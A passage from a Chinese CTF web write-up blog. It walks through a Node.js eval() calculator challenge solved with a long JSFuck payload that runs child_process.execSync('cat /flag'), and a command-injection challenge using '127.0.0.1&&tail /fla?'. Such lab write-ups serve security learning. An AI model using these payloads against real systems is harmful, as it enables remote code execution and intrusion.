+<p>官方手册：<a href="https://www.php.net/manual/zh/language.oop5.decon.php" target="_blank" rel="noopener noreferrer">__destruct() 是在对象生命周期结束时自动调用<i class="fas fa-external-link-square-alt ms-1"></i></a></p>
+</li>
+<li>
+<p>这个破坏利用方式被称作 &ldquo;<strong>反序列化key覆盖/孤儿对象/覆盖提前析构</strong>&quot;，本质是<strong>覆盖失去引用立即被销毁</strong>。</p>
+</li>
+</ul>
+
+<h2 id="challenge-info----3" data-numberify>Challenge Info - [<a class="anchor ms-1" href="#challenge-info----3"></a></h2>
+<p>什么愚蠢的计算器，我算个数都要Waf（一开始就按到8了）</p>
+<p><picture><img class="img-fluid " alt="chrome_3Wy7lMZKco" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>题目附件给了源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">json</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">WAF</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">recipe</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ALLOW_CHARS</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^[012345679!\.\-\+\*\/\(\)\[\]]+$/</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ALLOW_CHARS</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">recipe</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">calc</span>(<span style="color:#a6e22e">operator</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> eval(<span style="color:#a6e22e">operator</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/index.html&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/calc&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">expr</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">expr</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">WAF</span>(<span style="color:#a6e22e">expr</span>)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">calc</span>(<span style="color:#a6e22e">expr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">result</span> });
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;result&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;WAF&#34;</span>});
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Server running on port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});    
+</span></span></code></pre></div><p>路径 <code>/calc</code> 接收 POST JSON <code>{&quot;expr&quot;:&quot;...&quot;}</code></p>
+<p>而且只允许!.-+*/()[]和9个数字(没有8)，题目明示jsfuck，这是一种利用<code>[]()!+</code>字符表示js语句的编码方式</p>
+<p>在 Node.js 里，如果可以运行任意 JS 代码，最容易想到的“命令执行”写法如下：</p>
+<p>JavaScript</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)
+</span></span></code></pre></div><ul>
+<li><code>require('child_process')</code> 加载核心模块 child_process</li>
+<li><code>.execSync()</code> 是它的方法（同步执行一条 shell 命令）</li>
+<li><code>cat /flag</code> 是要执行的命令，回显 flag 文件内容</li>
+</ul>
+<p>而题目把require过滤掉了，所以要找一个间接调用</p>
+<p>我们的payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)
+</span></span></code></pre></div><p>payload可以去 [JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+](<a href="https://jsfuck.com/" target="_blank" rel="noopener noreferrer">https://jsfuck.com/<i class="fas fa-external-link-square-alt ms-1"></i></a>) 生成</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;expr&#34;</span>:<span style="color:#e6db74">&#34;[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][[]]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())&#34;</span>}
+</span></span></code></pre></div><p>解析最后拿到的flag</p>
+<p><picture><img class="img-fluid " alt="msedge_oXiX85Q2OB" src="" loading="lazy" />
+</picture>
+
+</p>
+
+<h2 id="challenge-info----4" data-numberify>Challenge Info - [<a class="anchor ms-1" href="#challenge-info----4"></a></h2>
+<p>这道题对cat flag *有过滤，直接绕过</p>
+<p>讲解一下payload: <code>127.0.0.1&amp;&amp;tail /fla?</code></p>
+<p><code>&amp;&amp;tail /fla</code>：<code>&amp;&amp;</code> 在 shell 语句中是“前面命令执行成功后再执行后面的”意思</p>
+<p><code>/fla</code>：通常靶场flag名是<code>/flag</code>，所以很多题用 <code>/fla</code> 或 <code>/fla?</code> 去猜测真实flag文件名、靠补全匹配（比如有些靶机可能会ls、会自动补.ck、补空格）</p>
+<p><picture><img class="img-fluid " alt="msedge_sohllbldp2" src="" loading="lazy" />
+</picture>
+
+</p>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/posts/arch&#43;hyprland&#43;linux%E5%B0%8F%E6%8A%80%E5%B7%A7/">Arch&#43;Hyprland</a>
+    </div><div class="post-nav post-next">
+      <a href="/posts/ctf-web-guide/">[持续更新] CTF-Web Guide</a>
+      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
+    </div></div>
+</div></article>
+<section class="related-posts row card component">
+      <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">
+          Related Posts
+        </h2>
+      </div>
+      <div class="card-body slide px-1">
+        <div class="slide-inner row gx-0"><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="XXE漏洞利用" src="http://localhost:1313/images/xxe.png" loading="lazy"
+     width="700"
+     height="502"/>
+  </picture>
+
+  <a class="post-title" href="/posts/xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+    XXE漏洞利用
+  </a>
+  <div class="post-meta mb-0">
+    February 17, 2026
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="[持续更新] CTF-Web Guide" src="http://localhost:1313/images/1.png" loading="lazy"
+     width="2400"
+     height="1350"/>
+  </picture>
+
+  <a class="post-title" href="/posts/ctf-web-guide/">
+    [持续更新] CTF-Web Guide
+  </a>
+  <div class="post-meta mb-0">
+    December 22, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="SQLi-labs靶场搭建" src="http://localhost:1313/images/SQL.png" loading="lazy"
+     width="1546"
+     height="699"/>
+  </picture>
+
+  <a class="post-title" href="/posts/sqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+    SQLi-labs靶场搭建
+  </a>
+  <div class="post-meta mb-0">
+    December 22, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="SQL注入——sqli-labs学习笔记" src="http://localhost:1313/images/SQL1.png" loading="lazy"
+     width="474"
+     height="240"/>
+  </picture>
+
+  <a class="post-title" href="/posts/sqli-labs/">
+    SQL注入——sqli-labs学习笔记
+  </a>
+  <div class="post-meta mb-0">
+    December 22, 2025
+
+  </div>
+</div>
+
+          </div><div class="col-12 col-md-6 col-lg-4 me-2">
+            <div class="post-card card card-body p-0 border-0 surface">
+  
+  <picture><img class="img-fluid" alt="双重md5爆破" src="http://localhost:1313/images/MD5.png" loading="lazy"
+     width="626"
+     height="251"/>
+  </picture>
+
+  <a class="post-title" href="/posts/%E5%8F%8C%E9%87%8Dmd5%E7%88%86%E7%A0%B4/">
+    双重md5爆破
+  </a>
+  <div class="post-meta mb-0">
+    December 5, 2025
+
+  </div>
+</div>
+
+          </div></div>
+        <button class="slide-control-left">
+          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i>
+          <span class="visually-hidden">Left</span>
+        </button>
+        <button class="slide-control-right">
+          <i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-270"></i>
+          <span class="visually-hidden">Right</span>
+        </button>
+      </div>
+    </section><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">Comments</h2>
+  </div>
+  <div class="card-body">
+
+<div class="giscus"></div>
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="card mb-3">
+  <div class="card-body text-center">
+    <img src="/images/my-avatar.jpg" alt="我的头像" class="rounded-circle mb-2" width="100" height="100">
+    <h5 class="card-title">xiaochai_123</h5>
+	<p id="random-quote" class="card-text text-muted"></p>
+	<script>
+	const quotes = [
+  "Stay hungry, stay foolish.",
+  "欢迎大佬莅临",
+  "路漫漫其修远兮，吾将上下而求索",
+  "前途是光明的，道路是曲折的",
+  "我唯一知道的，就是我一无所知"
+	];
+	document.getElementById('random-quote').innerText = quotes[Math.floor(Math.random() * quotes.length)];
+	</script>
+<nav class="d-flex justify-content-center gap-2 my-2">
+  <a class="btn btn-sm btn-outline-dark rounded-circle" href="https://github.com/xiaochai-123" title="GitHub" target="_blank">
+    <i class="fab fa-github"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-primary rounded-circle" href="mailto:l2556843965@163.com" title="Email">
+    <i class="fas fa-envelope"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-danger rounded-circle" href="https://space.bilibili.com/595746072" title="Bilibili" target="_blank">
+  <i class="fab fa-bilibili"></i> 
+</a>
+  
